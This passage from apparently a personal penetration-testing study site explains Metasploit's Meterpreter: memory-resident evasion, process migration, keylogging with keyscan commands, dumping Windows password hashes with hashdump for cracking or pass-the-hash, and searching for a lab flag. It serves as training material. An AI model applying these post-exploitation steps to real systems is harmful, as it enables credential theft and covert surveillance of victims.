rev_shell.py</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler.</p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="meterpreter">Meterpreter<a class="hash-link" href="#meterpreter" title="Direct link to heading">â€‹</a></h2><p>Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components.
Meterpreter runs in memory RAM to avoid having a file that has to be written to the disk on the target system. This way, Meterpreter will be seen as a process and not have a file on the target system.
Meterpreter also aims to avoid being detected by network-based IPS and IDS solutions by using encrypted communication with the server where Metasploit runs.</p><p>After exploiting a machine, we can see the process ID (PID) where Meterpreter is running by writing <code>getpid</code>. We can find that processes with <code>ps</code>command. It is shown as spoolsv.exe and the user is NT AUTHORITY\SYSTEM</p><p>There are different meterpreter payloads that can be used <code>msfvenom --list payloads | grep meterpreter</code>. The decision on which version of Metrpreter to use will be mostly based on three factors:</p><ul><li>The target operating system</li><li>Components available on the target system</li><li>Network connection types you can have with the target system</li></ul><p>We can run the command <code>help</code> to see the command options.</p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="post-exploitation-with-meterpreter">Post-Exploitation with Meterpreter<a class="hash-link" href="#post-exploitation-with-meterpreter" title="Direct link to heading">â€‹</a></h3><h4 class="anchor anchorWithStickyNavbar_y2LR" id="help">Help<a class="hash-link" href="#help" title="Direct link to heading">â€‹</a></h4><p>Will give you a list of all available commands in Meterpreter.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="meterpreter-commands">Meterpreter commands<a class="hash-link" href="#meterpreter-commands" title="Direct link to heading">â€‹</a></h4><p>The <code>getuid</code> command will display the user with which Meterpreter is currently running.
The <code>ps</code> command will list running processes.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="migrate">Migrate<a class="hash-link" href="#migrate" title="Direct link to heading">â€‹</a></h4><p>Migrating to another process will help Meterpreter interact with it.
Some Meterpreter versions will offer you the <code>keyscan_start</code>, <code>keyscan_stop</code>, and <code>keyscan_dump</code> command options to make Meterpreter act like a keylogger (when migrating to word.exe and similar). Migrating to another process may also help you to have a more stable Meterpreter session.</p><p>If you migrate from a higer privileged user to another with lower privileges, you may lose your user privileges.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="hashdump">Hashdump<a class="hash-link" href="#hashdump" title="Direct link to heading">â€‹</a></h4><p>The <code>hashdump</code> command will list the content of the SAM database. The SAM (Security Account Manager) database stores user&#x27;s passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.</p><p>While it is not mathematically possible to &quot;crack&quot; these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.</p><h4 class="anchor anchorWithStickyNavbar_y2LR" id="search">Search<a class="hash-link" href="#search" title="Direct link to heading">â€‹</a></h4><p>The <code>search</code> command is useful to locate files with potentially juicy information.</p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; search -f flag2.txt</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h4 class="anchor anchorWithStickyNavbar_y2LR" id="shell">Shell<a class="hash-link" href="#shell" title="Direct link to heading">â€‹</a></h4><p>The <code>shell</code> command will launch a regular command-line shell on the target system. Pressing <code>CTRL+Z</code> will help you go back to the Meterpreter shell.</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Metasploit.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_mS5F" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_mt2f"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/docs/Cibersecurity/Linux Privilege Escalation"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Linux Privilege Escalation</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/docs/Cibersecurity/Network Services"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Network Services</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#main-components-of-metasploit" class="table-of-contents__link toc-highlight">Main Components of Metasploit</a><ul><li><a href="#modules" class="table-of-contents__link toc-highlight">Modules</a></li><li><a href="#msfconsole" class="table-of-contents__link toc-highlight">Msfconsole</a></li><li><a href="#working-with-modules" class="table-of-contents__link toc-highlight">Working with modules</a></li><li><a href="#using-modules" class="table-of-contents__link toc-highlight">Using modules</a></li><li><a href="#sessions" class="table-of-contents__link toc-highlight">Sessions</a></li></ul></li><li><a href="#exploitation" class="table-of-contents__link toc-highlight">Exploitation</a><ul><li><a href="#scanning" class="table-of-contents__link toc-highlight">Scanning</a></li><li><a href="#the-metasploit-database" class="table-of-contents__link toc-highlight">The Metasploit Database</a></li><li><a href="#vulnerability-scanning" class="table-of-contents__link toc-highlight">Vulnerability scanning</a></li><li><a href="#exploitation-1" class="table-of-contents__link toc-highlight">Exploitation</a></li><li><a href="#msfvenom" class="table-of-contents__link toc-highlight">Msfvenom</a></li></ul></li><li><a href="#meterpreter" class="table-of-contents__link toc-highlight">Meterpreter</a><ul><li><a href="#post-exploitation-with-meterpreter" class="table-of-contents__link toc-highlight">Post-Exploitation with Meterpreter</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 Built with ðŸ§  By NENmSIS</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3e9c2769.js"></script>
<script src="/assets/js/main.edc28e48.js"></script>
</body>
</html>